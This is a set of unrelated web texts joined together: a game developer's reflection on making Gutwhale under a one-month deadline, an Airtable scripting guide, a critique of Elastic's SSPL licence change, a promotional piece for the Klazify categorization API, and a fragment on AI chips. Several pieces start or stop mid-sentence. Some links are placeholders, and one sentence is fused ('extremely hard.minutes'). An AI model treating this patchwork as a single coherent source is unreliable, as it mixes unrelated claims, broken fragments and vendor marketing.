I also did a lot of short jams alone, where i would sit down and give myself 30 minutes to make a prototype.<br>
Many of the gifs I post on twitter are the results of these solo jams.</p><p> 

This helped me to learn to code and to design and to schedule, but over time I found that simply making stuff was not enough anymore.</p><p>
What I really love is doing something new. <br>
Something that has not existed before.<br>
Finding a new angle on an old problem brings me an intense, deep joy that is really hard to describe.</p><p>

There is a lot of unexplored space in games and what I am currently really interested in is <strong>expression</strong>:<br>
How do I tell a story through a game? </p><p>
How do I communicate how I feel through videogames? </p><p>
Its really hard and kind of stupid, considering that videogames are all about endless repetition in closed systems, but its what i want to explore right now.</p><p>

And I explored it at my own pace while working as a receptionist, making games like <a href="https://www.google.com/">Up in the sky</a> and <a href="https://www.google.com/">Every Wall</a>.
</p></div>

<h2>the important thing</h2>
<div><p>There is a game developer called <a href="https://twitter.com/miziziziz">miziziziz</a>, one of the few who makes watchable youtube videos, 
who made a commercial game called <a href="https://store.steampowered.com/app/1232330/Theyest_Thou">Theyes Thou</a> in one month.</p><p>

When I lost my job as a receptionist because of the coronavirus, I decided to steal that idea.<br>
Since I am not overly interested in traditional FUN game design, I needed to make something that felt new to me. <br>
I needed to make a game that actually said something about the world we move through everyday. Just making an entertainment box would have been too boring and unfocused. </p><p>

But since I was unemployed I felt like I needed to make something that at least had a shot at commercial viability. One month is not a lot of time, but I needed to come up with something that people would also want to pay for.
<br>
The roguelike we ended up making contains a short section at the end where I try to actually say something, where I try to express myself. This part of the game was important to me, the rest was just decorations. <br>
I wanted people to buy the game because it looked like a nice little roguelike, and then, in the end, I wanted them to engage with this secret part of the game that was actually important to me. </p><p>

And I had one month to make that real.</p></div>

<h2>the power of deadlines</h2>
<p>Gutwhale is a product of its deadline.<br> 
All of it was made in the easiest way possible. The code is a mess of course, but I want to talk more about the decisions, forced upon us by the deadline, that permeate the whole project:<br></p>

<ul>
  <li>
    <p>Gutwhale is only called Gutwhale because the project needed an artist.
<a href="https://twitter.com/franek">Franek</a> is very good at making pixelart and he, for whatever reason, also loves to draw whales. So when he was on the fence about joining the project, I quickly changed the setting to take place inside of a whale. This does not make a lot of sense, but Franek got to draw a whale and the game had an artist.
<br></p>
  </li>
  <li>
    <p>Gutwhale used to take place on a single screen, because then I would not have to write a camera system. When it turned out that a single screen was pretty boring, we just glued multiple single screens together and make the floor break once all enemies were defeated. The core loop of Gutwhale was born out of not wanting to code a camera system.
<br></p>
  </li>
  <li>
    <p>The small size of the Levels themselves helped me in a lot of ways. The level generation code does not need to consider unreachable platforms and could be hacked together violently. Because there is so little space to move around in, enemies become more dangerous and I needed to code less of them to fill the game.<br></p>
  </li>
</ul>

<p>The deadline forced me to think quickly and to design dirtily, accidentally disovering some pretty neat things.<br>
It certainly has also hurt the game in a lot of ways.
<br></p>

<h2>the cost of deadlines</h2>

<p>Gutwhale is unbalanced in both directions. <br></p>

<div><p>For people with little to no platformer roguelike experience, it is extremely hard.minutes and then give up, never to touch the game again.</p><p>

For people who played downwell and gonner, it is a piece of cake and they can 100% the game in around 20 minutes. There is an endless nightmare mode, but it did not have an engaging highscore system, so the best players of Gutwhale quickly got bored.</p><p>

The save system of Gutwhale had horrible bugs and there were technical problems all over the place, prohibitung us from implementing Achievements and updating the game easily.<br>
We used Construct 2, an engine that is no longer supported by its developers in favour of Construct 3. This made it impossible to add Steam Achievements and created some other technical problems.
<br>
And these problems are just that: <br>
Problems. </p><p>

They exist because we rushed through development at an insane speed and I can forgive myself for making them, because I was actually focusing on this one secret thing at the end.
</p><p>
<strong>BUT</strong></p><p>
The part of the game that is most important to me, the ending, is also not working as intended. I was unable to clearly communicate what I wanted to communicate. 
<br>
There was not enough time to conduct long term playtests and interview players about how they perceived the ending.<br>
There was not enough time for me to really reflect and ponder and tweak and adjust the ending of Gutwhale.<br>
I started the project as a compromise between compelling gameplay and a secret, expressive part, which enabled me to keep working on the game.<br>
And that part did not work. It did not resonate. <br>
At least it feels like that to me now.</p></div>

<h2>the nice things</h2>

<p>Gutwhale was a success overall: <br></p>
<ul>
  <li>
    <p>It made me more money than I would have earned at my previous job, but not nearly enough to not have to go back to that job in 7 days.<br></p>
  </li>
  <li>
    <p>It may make substantially more money on consoles or in bundles in the future.</p>
  </li>
  <li>
    <p>It gave me a better understanding of how to sell stuff on steam.</p>
  </li>
  <li>
    <p>and last but defenitly not least, I got to work with Franek, Britt Brady and Clovelt who have thaught me a lot and are amazing people.
<br></p>
  </li>
</ul>

<h2>conclusion</h2>

<div><p>Finishing games is hard. <br>
Really hard. <br>
As a way to deal with this, a series of game jams has been created, where speed is key and the end product is only as important as the fact that it got finished.<br>
We have seen amazing games made in insanely short times and countless people have been able to dabble in game dev because of the contained nature of game jams.</p><p>

<strong>BUT</strong></p><p>
Applying this need for speed to bigger projects creates dynamics that should not be confused with efficiency and skill.</p><p>

The core part of Gutwhale, the one thing I was truly interested in, withered and died because of the deadline, because we were so wrapped up in getting the game done. <br>
There was simply not enough time to stop and smell the flowers.<br>
The deadline mercilessly  and in cold blood, pulled us away from being able to express ourselves.</p><p>

Gutwhale is nice and I am proud of it, but i think it is time for me to force myself to move on to a different way of development.</p><p>

When i did not know what I wanted express through the games I make, when i just wanted to MAKE, I needed frameworks to support me, to force me to do the work and to put in the hours, but after years of doing that, those structures have started to feel inhibiting in the best way possible. <br>
They are still able to teach me and to challenge me, but in the end, they are also keeping me from moving towards, to where I want to go, to do what I want to create.<br>
Deadlines keep me from really reflecting and looking at myself. They keep me from thinking about what i want to express through my work and they keep me from then actually saying that.</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>You might have missed <a href="https://blog.airtable.com/airtable-platform-launch-automations-sync-apps/">the memo</a>: Airtable is ready for developers.</p><p>In the span of a year, Airtable went from a simple <a href="https://airtable.com/api">REST API</a> to now supporting <a href="https://airtable.com/developers/scripting">scripting</a>, a <a href="https://airtable.com/developers/apps">custom apps SDK</a>, built in <a href="https://support.airtable.com/hc/en-us/articles/360050974153-Automations-Overview">automations</a>, and a small but growing ecosystem of <a href="https://airtable.com/marketplace">third-party tools and services</a>.</p><p>As a developer looking to build on Airtable, where should you start? And what is the developer experience like?</p><p>This guide aims to help developers navigate Airtable and build great applications on this growing platform.</p><h2><em>In</em> or <em>on</em> Airtable?</h2><p>Who is your user and what do they need? This age-old question is still the first one to ask as you begin to consider which Airtable developer tools to use.</p><p>At a high-level, you can classify Airtable's suite of <a href="https://airtable.com/developers">developer tools</a> as either supporting use cases that happen inside the Airtable interface (i.e. <em>in</em> Airtable) or outside Airtable in another app or tool (i.e. <em>on</em> Airtable).</p><p><img src="https://blog.syncinc.so/dev-guide/031_in_or_on.png" alt="in or on diagram"></p><p>When you are building <em>in</em> Airtable, the user is logged into Airtable and using your software within the Airtable interface. For any code you want to run <em>in</em> Airtable you'll be using either scripts, automations, or the custom app SDK.</p><blockquote><p>Note: Yes, I know, automations can trigger actions outside of Airtable. But by and large, the end user is <em>in</em> Airtable.</p></blockquote><p>If you are building <em>on</em> Airtable, then you are building for users outside of Airtable. This might be a custom internal tool, a dashboard built in Google Data Studio, a public Next.js website, or inside another SaaS application all together. In these use cases, you'll be using the Airtable REST API directly or using a tool like the one I helped build - <a href="https://syncinc.so/?utm_source=blog&amp;utm_medium=post&amp;utm_campaign=at-dev-guide">Sync Inc</a>.</p><p>As you decide whether to build <em>in</em> on <em>on</em> Airtable, you should consider what <a href="https://airtable.com/pricing">Airtable plan</a> your users are on as well. The REST API is available on every plan to every Airtable user. Automations are available on every plan, but capped at different limits. Meanwhile, scripts and custom apps are only available on pro and enterprise plans.</p><p><img src="https://blog.syncinc.so/dev-guide/020_pricing.png" alt="pricing"></p><blockquote><p>Note: Airtable Apps were formerly known as <em>Airtable Blocks</em>. The new name is slowly catching on but you'll still see the term <em>blocks</em> pop up here and there.</p></blockquote><p>Lastly, as your considering whether to build <em>in</em> or <em>on</em> Airtable, consider the functionality you need. When building <em>in</em> Airtable, you will face a couple constraints when working with 3rd party APIs, caching data, or manipulating the UI.</p><h2>Airtable's data quirks</h2><p>It's worth touching on Airtable's data model.</p><p>From a developer's perspective, Airtable is basically a hosted database fused to an easy interface for creating and managing data. This easy-to-use interface means the database schema is super flexible. Tables, columns, and field types can emerge, change, or disappear at anytime. Airtable is highly valuable because of this flexibility, but it also makes developing on Airtable a bit more unpredictable.</p><p>Additionally, as a data store, Airtable supports all sorts of <a href="https://airtable.com/developers/scripting/api/cell_values">data types</a>. Most of these data types are familiar and predictable.</p><p>However, two of these data types - <code>lookups</code> and <code>formulas</code> - can take the form of any other type. This makes sense given how Airtable works: if a formula is concatenating text, then its result is a string. If it is summing numbers, then its result is a number. This means the data type of these fields is a black box, sort of like the <code>any</code> type in TypeScript.</p><p>As a #protip to deal with Airtable's data flexibility, I highly recommend developing on a "staging" copy of the Airtable base you are working with. This helps reduce the likelihood that an end user will change data as you build. And, of course, this allows you to break things, a hallmark of a great development process. Airtable can duplicate a base remarkably fast (especially when you think about what's happening under the hood!) - so use this to your advantage.</p><p><img src="https://blog.syncinc.so/dev-guide/021_duplicate.png" alt="duplicate"></p><p>So: Which of the many options should you use to build on Airtable? Let's first consider building <em>in</em> Airtable with Airtable scripts.</p><h2>Airtable scripts: little record robots</h2><p><a href="https://airtable.com/developers/scripting">Airtable scripts</a> are short JavaScript snippets that allow you to manipulate data in your Airtable base.</p><p>You can do just about anything to the data in your base that is made possible with the standard JavaScript library. There are a couple limits:</p><ol><li>You can't import other JS libraries. You can copy and paste smaller, minified libraries that fit into one file - but it's usually a stretch.</li><li>You can't touch the DOM.</li><li>You can't change the schema of the base. You can't, for example, create new tables or views.</li></ol><p>To use scripts, you need to add the <em>scripting app</em> (f.k.a <em>scripting block</em>) to your base. This means you need to be on either the Pro or Enterprise Airtable plans.</p><p>It's also worth noting that Airtable now allows developers to share (no selling yet!) scripts in the <a href="https://airtable.com/marketplace/category/scripts">Airtable marketplace</a>. So if you write a killer script that is agnostic to a base, the entire community can benefit. In the marketplace you'll find all sorts of great script examples (in addition to those in the <a href="https://airtable.com/developers/scripting/examples">docs</a>).</p><h3>Elements of a script</h3><p>Before diving into a hands-on example, unpacking the building blocks of Airtable scripts will set the foundation for the rest of this guide.</p><p><strong>Getting data from the base</strong></p><p>Virtually every script (or automation/app for that matter) is going to start off by pulling data from an Airtable base.</p><p>Airtable follows a pretty straightforward relational model. Let's briefly step through it:</p><p>An Airtable workspace can contain many Airtable bases. Your script will run within one of these bases.</p><p>To add a script to a base, you'll install the <a href="https://support.airtable.com/hc/en-us/articles/360043041074-Scripting-app-overview"><strong>Scripting App</strong></a> in your base.</p><p>Then, to access information about the base in a script you'll use the <a href="https://airtable.com/developers/scripting/api/base">base model</a>.</p><p>For instance, if you pop open the scripting app, you can quickly retrieve the name of the Airtable base:</p><pre><p><span>console</span><span>.</span><span>log</span><span>(</span><span>`</span><span>The name of my base is </span><span>${</span><span>base</span><span>.</span><span>name</span><span>}</span><span>.</span><span>`</span><span>)</span><span>;</span><span></span></p></pre><p>Or, get the number of tables in the base:</p><pre><p><span>console</span><span>.</span><span>log</span><span>(</span><span>`</span><span>This base contains </span><span>${</span><span>base</span><span>.</span><span>tables</span><span>.</span><span>length</span><span>}</span><span> tables.</span><span>`</span><span>)</span><span>;</span><span></span></p></pre><p>As the prior query indicates, a base can contain many tables. You can interact with tables using the <a href="https://airtable.com/developers/scripting/api/table">table model</a>. So when you want to work with a table you retrieve it from the base:</p><pre><p><span>let</span><span> table </span><span>=</span><span> base</span><span>.</span><span>getTable</span><span>(</span><span>"Tasks"</span><span>)</span><span>;</span><span></span></p></pre><p>Once you have a table loaded into your script, you can access its <a href="https://airtable.com/developers/scripting/api/view">views</a>, <a href="https://airtable.com/developers/scripting/api/field">fields</a> and <a href="https://airtable.com/developers/scripting/api/record">records</a>.</p><p>A view is simply a filtered set of data in the table. So let's say you want to just pull all the records from a particular view:</p><pre><p><span>let</span><span> table </span><span>=</span><span> base</span><span>.</span><span>getTable</span><span>(</span><span>"Tasks"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> view </span><span>=</span><span> table</span><span>.</span><span>getView</span><span>(</span><span>"Todo"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> query </span><span>=</span><span> </span><span>await</span><span> view</span><span>.</span><span>selectRecordsAsync</span><span>(</span><span>)</span><span>;</span><span></span></p></pre><p>The variable <code>query</code> is now going to contain all the records from the <code>Todo</code> view.</p><p>Now, when you want to inspect just one <code>Todo</code> record, you'll use the <a href="https://airtable.com/developers/scripting/api/record#get-cell-value"><code>getCellValue()</code> function</a>. As so:</p><pre><p><span>let</span><span> table </span><span>=</span><span> base</span><span>.</span><span>getTable</span><span>(</span><span>"Tasks"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> view </span><span>=</span><span> table</span><span>.</span><span>getView</span><span>(</span><span>"Todo"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> query </span><span>=</span><span> </span><span>await</span><span> view</span><span>.</span><span>selectRecordsAsync</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span></span><span>let</span><span> record </span><span>=</span><span> query</span><span>.</span><span>records</span><span>[</span><span>0</span><span>]</span><span>;</span><span></span></p><p><span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>record</span><span>.</span><span>getCellValue</span><span>(</span><span>"Description"</span><span>)</span><span>)</span><span>;</span><span></span></p></pre><p><img src="https://blog.syncinc.so/dev-guide/032_script_example.png" alt="Script example"></p><p>This quickly outlines the practical methods for pulling data from the base. You'll find that Airtable scripts includes some other models to get information on the user (a.k.a collaborator), session and more in the <a href="https://airtable.com/developers/scripting">docs</a>. But retrieving tables and records is the crux of working with data in Airtable.</p><p><strong>Collecting input from the user</strong></p><p>Beyond pulling data from the Airtable base, you'll also want to retrieve inputs from the user.</p><p>You may want to prompt the user for which table they want to evaluate in the script or which file they want to import. To do so, you'll use the <a href="https://airtable.com/developers/scripting/api/input">input object</a>. All input methods are asynchronous, so you'll always prefix each function call with <code>await</code>.</p><p>For instance, to ask the user their name:</p><pre><p><span>let</span><span> name </span><span>=</span><span> </span><span>await</span><span> input</span><span>.</span><span>textAsync</span><span>(</span><span>"What is your name?"</span><span>)</span><span>;</span><span></span></p><p><span>output</span><span>.</span><span>text</span><span>(</span><span>`</span><span>Your name is </span><span>${</span><span>name</span><span>}</span><span>.</span><span>`</span><span>)</span><span>;</span><span></span></p></pre><p><img src="https://blog.syncinc.so/dev-guide/033_name_prompt.png" alt="Name prompt"></p><p>You can have users enter text, click a button, select a table, view, field, or even a record. Combined, these inputs allow your script to interact with the user in all sorts of ways.</p><p><strong>Fetching data from an API</strong></p><p>In addition to collecting data from the Airtable base and user, you can also <a href="https://airtable.com/developers/scripting/api/fetch">fetch data</a> from third-party APIs.</p><pre><p><span>let</span><span> response </span><span>=</span><span> </span><span>await</span><span> </span><span>fetch</span><span>(</span><span>"https://api.github.com/orgs/Airtable"</span><span>)</span><span>;</span><span></span></p><p><span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>await</span><span> response</span><span>.</span><span>json</span><span>(</span><span>)</span><span>)</span><span>;</span><span></span></p></pre><p>If the API you are calling requires authentication, your authentication token will be sitting right in the script. Keep in mind that users can view the underlying code in your script! If you don't trust the user, don't use an API fetch in your script.</p><p>Lastly, when using fetch, consider that <a href="https://airtable.com/developers/scripting/api/fetch#differences-from-fetch-in-the-browser">Airtable is not providing you with full fledge browser fetch</a>.</p><p><strong>Presenting data to the user</strong></p><p>Last but not least, after collecting data from the Airtable base, user or third-party API you'll then process that data and either update data in the base (using the table model functions of <code>createRecordAsync()</code>, <code>updateRecordAsync()</code>, or <code>deleteRecordAsync()</code>) or present data to the user.</p><p>To present a value to the user, you'll use the <a href="https://airtable.com/developers/scripting/api/output"><code>output</code> object</a>. You might output information as the scripts run to keep your user informed or to present a final results. Here is a simple "Hello, world!":</p><pre><p><span>output</span><span>.</span><span>markdown</span><span>(</span><span>"Hello, *world*!"</span><span>)</span><span>;</span><span></span></p></pre><p><img src="https://blog.syncinc.so/dev-guide/034_output.png" alt="Output"></p><p>You can present the user plain text, markdown, or a table.</p><h3>Writing a script</h3><p>Now, let's write a quick script to put these ideas to work.</p><p>To play along with this example (and make this post more enjoyable), you can add <a href="https://airtable.com/templates/sales-and-customers/expvjTzYAZareV1pt/sales-crm">this Sales CRM base template</a> to your workspace by clicking the <strong>Use Template</strong> button.</p><p>This template base is a simple Airtable CRM for tracking sales. As an example, let's say you want to write a script to calculate the current value of all open opportunities in the sales pipeline. This will give you a sense of how much potential revenue is available to the company. To do so, you want to sum up the <code>Estimated Value</code> for all deals that are active - that is, not yet won nor lost.</p><p>First, add the scripting app to the base by clicking the <strong>APPS</strong> button and selecting <strong>+ Install an app</strong>:</p><p><img src="https://blog.syncinc.so/dev-guide/001_add_app.png" alt="Add app"></p><p>Select the <strong>Scripting</strong> app.</p><p><img src="https://blog.syncinc.so/dev-guide/002_select_scripting.png" alt="Scripting app"></p><p>Apps live in Airtable dashboards. So click <strong>Install app</strong> and select the <strong>Sales CRM HQ</strong> dashboard.</p><p><img src="https://blog.syncinc.so/dev-guide/003_select_dash.png" alt="Scripting app"></p><p>The scripting app will now open. Start with a blank slate by deleting the <code>Hello, World</code> example that is pre-loaded.</p><p>Now, write your script. Initiate a variable that will store the total value of the pipeline. You can call it <code>pipeline_value</code>:</p><pre><p><span>let</span><span> …</span></p></pre></div></div></div>

      <section itemprop="text">
        
        <p>In a play to convert users of their open source projects into paying customers, today Elastic announced that they are <a href="https://www.elastic.co/blog/licensing-change">changing the license</a> of both Elasticsearch and Kibana from the open source Apache v2 license to <a href="https://www.mongodb.com/licensing/server-side-public-license">Server Side Public License</a> (SSPL). If your organisation uses the open source versions of either Elasticsearch or Kibana in its products or projects, it is now at risk of being forced to release its intellectual property under terms dictated by another.</p>

<p>If you’re not yet aware of the SSPL, you can catch up <a href="https://mjg59.dreamwidth.org/51230.html">here</a>. As licenses go, it’s pretty problematic from a business perspective. Every <a href="https://en.wikipedia.org/wiki/Intellectual_property">IP lawyer</a> to whom I’ve showed the text of the SSPL has been rather alarmed before they even reach the end of it. Basically, it’s a hostile proprietary license masquerading in open source clothing. By using an SSPL project in your code, you are agreeing that if you provide an online service using that code then you will release not only that code but also the code for every supporting piece of software, all under the SSPL. It’s not a stretch to interpret the wording of the license as requiring users of the SSPL’d software therefore to release the code for everything straight down to the bare metal. There are those who will point to <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">the FAQ</a> for the SSPL and claim that the license isn’t interpreted in that way because the FAQ says so. Unfortunately, when you agree to a license you are agreeing to the <em>text of that license document</em> and not to a FAQ. If the text of that license document is ambiguous, then so are your rights and responsibilities under that license. Should your compliance to that license come before a judge, it’s <em>their</em> interpretation of those rights and responsibilities that will hold sway. This ambiguity puts your organisation at risk.</p>

<p>In <a href="https://www.elastic.co/blog/licensing-change">its announcement</a>, Elastic claims that this is simply a change of open source license. In one way they’re correct: they’re changing the license away from the open source Apache v2 license. However they are changing to what can best be described as a proprietary source available license, <em>not</em> to an open source one. MongoDB, the originators of SSPL, requested that <a href="https://opensource.org/">Open Source Initiative</a> (OSI) (the standards body that maintains the <a href="https://opensource.org/osd-annotated">Open Source Definition</a> and certifies licenses as open source) certify the SSPL as such. After a great deal of discussion among the panel of legal, licensing, and open source experts, MongoDB withdrew the SSPL from consideration as an open source license, as it appeared highly unlikely it would be certified as open source. That SSPL is not an open source license is no longer in dispute. That ship has sailed. If you have a problem with this, I suggest you <a href="https://lists.opensource.org/pipermail/license-discuss_lists.opensource.org/2019-May/020483.html">take it up</a> with OSI. As for Elastic’s public and verifiably false claim that SSPL is an open source license, it’s my hope that OSI will have a conversation with them and make a public statement of their own shortly.</p>

<p>No, this is a business decision, not an ideological one. Elastic made a business decision to change to this hostile proprietary license to give them a way to <del>extort</del>influence users to become customers. Without a great deal more strategic information about Elastic’s business and operations none of us are qualified to judge whether it’s the correct decision, but the decision itself is valid. They are allowed to make this sort of strategic move for their company.</p>

<p>However, you and your organisation have now also been forced into a business decision. If your organisation uses the Apache v2 licensed Elasticsearch or Kibana in its projects or products, it must now assume that it is at risk one way or another. It can upgrade to version 7.11 of these projects, thereby accepting the terms of SSPL and potentially also being required to release the code for its entire stack (a great deal of which it will not have the copyright over and will be unable to release, thereby potentially being in violation of SSPL). It can remain on version 7.10, but then it will no longer receive future updates, including important security fixes, thereby taking on another sort of risk. It could choose to pay for a Gold+ license for the software, but it’s unlikely that the budget is prepared for this sort of unexpected expense. And finally it can rearchitect its project or product, replacing Elasticsearch and/or Kibana with alternatives. Frankly, considering today’s unfriendly move by Elastic, putting some space between it and your organisation may be the safest alternative in the long run, but it will come with its own considerable price tag in time and other potential opportunity and switching costs.</p>

<p>The one thing your organisation cannot afford to do is ignore this. It’s time to call a meeting with your legal, software development, product, finance, and strategy teams to start to figure out the best option for you.</p>

January 14, 2021 | https://www.thestartupfounder.com/looking-for-a-free-website-categorization-api-check-this-company/ | <a href="https://web.archive.org/web/*/https://www.thestartupfounder.com/looking-for-a-free-website-categorization-api-check-this-company/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><strong>Website Categorization API</strong> classifies a site into a <strong>content</strong> <strong>category</strong>. It takes a <strong>URL</strong> as an input and assigns it into the relevant industry. There’s a lot of Categorizations API available on the internet but <a href="https://www.klazify.com/">Klazify</a> seems to be the most popular above all and should suit all your needs.</p>
<p><a href="https://www.klazify.com/">Klazify’s Website Categorization API</a> uses a machine learning (ML) engine to scan a website’s content and meta tags. It extracts text to classify the site and assigns up to three categories aided by natural language processing (NLP).</p>
<p>Their offline database is perfect for customers who require a local option for domain categorization. Typical use cases include hardware/product integrations, custom applications or internal use at an Enterprise organization with high request volume.</p>
<h2><strong>How Klazify works</strong></h2>
<p><a href="https://www.klazify.com/">Klazify</a> will navigate to the requested domain name or URL, collect its content,&nbsp; and determine appropriate categorizes based on a classification taxonomy: IAB V2 Standard, which can be used for 1-1 personalization, marketing segmentation, online filtering and more. The end result is that the URL or domain can now be placed in a specific category.</p>
<h2><strong>State Of The Art Accuracy</strong></h2>
<p>Their&nbsp; website categorization API is highly accurate, a simple lookup to a company’s URL will classify its industry within 385 possible topic categories.</p>
<h2><strong>Domain Processing</strong></h2>
<p><a href="https://www.klazify.com/">Klazify</a>’s domain processing begins one of two ways:</p>
<ul><li>New Domain Ingestion: Klazify examines the website, chasing new domains and re-indexing previously categorized domains.</li></ul>
<ul><li>External feeds: External data sources that are given to Klazify to process</li></ul>
<p><strong>Categorization</strong></p>
<p>Once a URL has been processed and passed the safety checks, it gets categorized.&nbsp;</p>
<h2><strong>Domain Categorization</strong></h2>
<p>There are over a lot of possible topic categories, making the list comprehensive but a little broader compared to other categorization taxonomies.&nbsp;</p>
<p><a href="https://www.klazify.com/category">Klazify’s categorization</a> is ideal for internet filtering and security applications, and best thing of all? They support all the domains available and almost all the languages of the world.</p>
<p>The Classification Taxonomy that Klazify uses is from the IAB, which was referenced before. IAB stands for “Interactive Advertising Bureau.” They’ve created a standard list of categories and subcategories for advertising purposes.</p>
<p>For example, if a publisher is putting together a campaign on Google Ads and only wants to show up on specific websites, Google utilizes the IAB classification to decide which category a certain domain belongs to. This means that if publishers are using Klazify to determine if websites URLs are relevant and pertinent for them to advertise on, the categorization that is given to them in Klazify is also used on advertising websites all over the internet.</p>
<h2><strong>Advertisers</strong></h2>
<p>For Advertisers, <a href="https://www.klazify.com/">Klazify</a> offers domain data categorized to the IAB taxonomy. Through Klazify’s API, customers can process large sets of data, allowing them to identify patterns between IPs and backlinking information or to categorize your data set. Advertisers often find this information useful in order to enhance customer demographics and better understand their behavior.</p>
<p>Once<a href="https://www.klazify.com/"> Klazify</a> finishes categorizing a domain, that domain can then have multiple categories associated with it. While a single website might only be placed in 3 categories using the IAB standards.</p>
<p>The IAB has nearly 385+ possible topic categories to choose from.&nbsp;</p>
<h2><strong>Network &amp; Cybersecurity</strong></h2>
<p>Network and Cybersecurity companies around the globe take advantage of <a href="https://www.klazify.com/">Klazify’s APIs </a>and data feeds to bring industry-leading threat intel and domain categorizations. Typical uses for Klazify include using their Domains API in order to dig deeper into network traffic or using their domain categorization API in order to categorize user access logs. Klazify incorporates over 66 data feeds to augment the engine.</p>
<h2><strong>Why Is <a href="https://www.klazify.com/">Klazify</a> The Best Option For Categorizing a Website?</strong></h2>
<h3><strong>Powerful &amp; Scalable</strong></h3>
<p>Klazify can scale to millions of requests and keep being stable under heavy workloads.</p>
<h3><strong>Easy-to-integrate</strong></h3>
<p>Customer’s time is valuable which is why Klazify’s APIs are simple to use and easy to integrate.</p>
<h3><strong>Dedicated Support Manager</strong></h3>
<p>Their Customer Support Team is always there to answer any questions.</p>
<h3><strong>Simple Documentation</strong></h3>
<p>Each endpoint is well documented with examples so a customer can quickly get started.</p>
<h2><strong>Key Features</strong></h2>
<h3><strong>Big Data</strong></h3>
<p>Using advanced machine learning, <a href="https://www.klazify.com/">Klazify</a> categorize billions of web pages, keeping the categorization database one of the most accurate in the industry.</p>
<h3><strong>Wide Range of Applications</strong></h3>
<p><a href="https://www.klazify.com/">Klazify’</a>s domain categorization allows customers to easily provide services such as Internet filtering, subscriber analytics, advertising networks, and fraud prevention.</p>
<h3><strong>Data Firehose</strong></h3>
<p>Need access to the raw data stream of everything as it’s being categorized? <a href="https://www.klazify.com/">Klazify</a> provides a real-time data firehose via HTTP.</p>
<p><strong>Advanced Algorithms</strong></p>
<p><a href="https://www.klazify.com/">Klazify’s technology</a> categorizes content found on URLs, as well as entire websites and IP addresses, perfect for security devices that may not have access to the full URL.</p>
<h3><strong>Developer-Friendly Responses</strong></h3>
<p>Every API response is returned as JSON, which can be easily read and implemented into your product.</p>
<h3><strong>Always Up to Date</strong></h3>
<p><a href="https://www.klazify.com/">Klazify’s web</a> crawlers are constantly visiting and classifying new and existing websites, providing real-time results and keeping the database always up to date.</p>
<h2><strong>So what’s the difference between the other website categorization API and <a href="https://www.klazify.com/">Klazify</a>?</strong></h2>
<p>The difference between all the other tools and <a href="https://www.klazify.com/">Klazify</a> is that the latter is the closest thing to a real human being checking every nook and cranny of the domain you’re interested in. The bonus is, this tool can do this on hundreds of thousands of websites in a single second for less than $790.00/year.</p>

But it does so extremely well.</p><p id="d7af">However, some of the ASICs described here are rather universal computers capable of solving different tasks (and in AI there are many different complex tasks, not only neural networks) but with uncommon (for now) architecture. There are different names for these processors: NPU, XPU, TPU, IPU, and so on, and maybe one day they will become for the computing field the same thing GPU became once.</p><p id="5ad1">Comparing to FPGA, you can’t reprogram ASIC to do a different thing once you need it (but remember, some of them are rather universal), its logic is fixed since being produced, yet on FPGA you can create another circuit that better suits your needs.</p><p id="0465">Due to this specialization, ASICs are usually much more energy efficient. AlphaGo example is a good case. While the first versions of AlphaGo were run on a cluster of CPUs and GPUs (<a href="https://en.wikipedia.org/wiki/AlphaGo#cite_note-DeepMindnature2016-11" target="_blank" rel="noopener">the distributed version in October 2015 was using 1,202 CPUs and 176 GPUs</a>), the later versions used TPUs achieving better results. To make a clear comparison it is required to compare the computing requirements of these algorithms as well, but I think, using here the overall performance + power consumption is a good proxy.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3000/0*gmCI3vWZZ8IPcilM" width="1500" height="762" srcset="https://miro.medium.com/max/552/0*gmCI3vWZZ8IPcilM 276w, https://miro.medium.com/max/1104/0*gmCI3vWZZ8IPcilM 552w, https://miro.medium.com/max/1280/0*gmCI3vWZZ8IPcilM 640w, https://miro.medium.com/max/1400/0*gmCI3vWZZ8IPcilM 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*gmCI3vWZZ8IPcilM?q=20"></p></div></div></div><figcaption><a href="https://deepmind.com/blog/article/alphago-zero-starting-scratch" target="_blank" rel="noopener">https://deepmind.com/blog/article/alphago-zero-starting-scratch</a></figcaption></figure><p id="07b4">Developing specialized hardware is a pretty long-term play.</p><p id="384f"><a href="https://arxiv.org/abs/1911.05289" target="_blank" rel="noopener">According to Google’s Jeff Dean</a>: <em>“Chip design projects that are started today often take 18 months to 24 months to finish the design, fabricate the semiconductor parts and get them back and install them into a production data center environment. </em><strong><em>For these parts to be economically viable, they typically must have lifetimes of at least three years</em></strong><em>. </em><strong><em>So, the challenge for computer architects building ML hardware is to predict where the fast-moving field of machine learning will be in the 2 to 5-year time frame.</em></strong><em>”</em></p><p id="afc1"><a href="https://www.electronicdesign.com/technologies/embedded-revolution/article/21808278/the-economics-of-asics-at-what-point-does-a-custom-soc-become-viable" target="_blank" rel="noopener">More on the economics of ASICs</a>.</p><p id="6771">ASICs are very interesting from different points of view.

